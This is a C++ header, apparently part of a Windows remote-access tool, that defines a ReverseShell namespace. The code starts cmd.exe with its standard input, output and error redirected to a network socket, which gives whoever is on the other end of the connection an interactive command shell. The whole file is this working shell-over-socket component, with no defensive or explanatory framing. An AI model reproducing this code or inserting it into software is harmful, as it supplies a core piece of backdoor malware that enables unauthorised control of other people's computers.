#pragma once

#include <Windows.h>
#include <string>

namespace ReverseShell
{
	namespace
	{
		static DWORD CALLBACK InvokeShell(LPVOID socket)
		{
			PROCESS_INFORMATION procInfo;
			STARTUPINFO si;
			LPWSTR szBin = _wcsdup(L"C:\\Windows\\System32\\cmd");

			memset(&si, 0, sizeof(STARTUPINFO));
			memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFO);
			si.hStdError = si.hStdInput = si.hStdOutput = (HANDLE)((SOCKET)socket);
			si.dwFlags = STARTF_USESTDHANDLES | STARTF_USEPOSITION | STARTF_USESHOWWINDOW;
			si.dwX = 400;
			si.dwY = 400;
			si.wShowWindow = SW_SHOW;

			if (!CreateProcess(NULL, szBin, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &procInfo))
				return GetLastError();

			WaitForSingleObject(procInfo.hProcess, INFINITE);
			CloseHandle(procInfo.hThread);
			CloseHandle(procInfo.hProcess);
			free(szBin);

			return 0;
		}
	}

	static void StartShellSession(SOCKET socket)
	{
		HANDLE hThread = CreateThread(NULL, 0, InvokeShell, (LPVOID)socket, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);	
	}
}